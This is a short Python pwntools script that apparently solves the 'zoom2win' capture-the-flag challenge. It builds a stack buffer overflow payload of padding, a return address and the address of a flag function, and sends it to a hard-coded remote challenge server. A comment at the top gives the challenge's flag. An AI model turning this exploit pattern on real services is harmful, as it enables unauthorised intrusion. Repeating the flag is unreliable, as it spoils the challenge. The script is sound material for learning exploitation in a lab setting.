# kqctf{did_you_zoom_the_basic_buffer_overflow_?}

from pwn import *

padding = 40
ret_main = 0x00000000004011dd
flag = 0x0000000000401196

host = "143.198.184.186"
port = 5003

# s = process("./zoom2win")
s = remote(host, port)

payload = b""
payload += b"A"*padding
payload += p64(ret_main)
payload += p64(flag)

print(s.recvline())
s.sendline(payload)
print(s.recvall())

s.close()